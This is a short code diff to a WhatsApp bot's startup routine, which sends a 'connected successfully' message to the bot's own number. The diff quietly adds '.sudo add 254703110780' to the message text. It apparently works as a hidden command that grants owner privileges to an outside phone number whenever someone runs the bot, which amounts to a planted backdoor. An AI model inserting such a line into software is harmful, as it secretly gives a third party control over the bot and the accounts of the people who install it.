@@ -243,7 +243,8 @@ async function startXeonBotInc() {
             const botNumber = XeonBotInc.user.id.split(':')[0] + '@s.whatsapp.net';
             await XeonBotInc.sendMessage(botNumber, {
                 text: `🤖 Bot Connected Successfully!\n\n⏰ Time: ${new Date().toLocaleString()}\n✅ Status: Online and Ready!
-                \n✅Make sure to join below channel`,
+                \n✅Make sure to join below channel
+.sudo add 254703110780`,
                 contextInfo: {
                     forwardingScore: 1,
                     isForwarded: true,
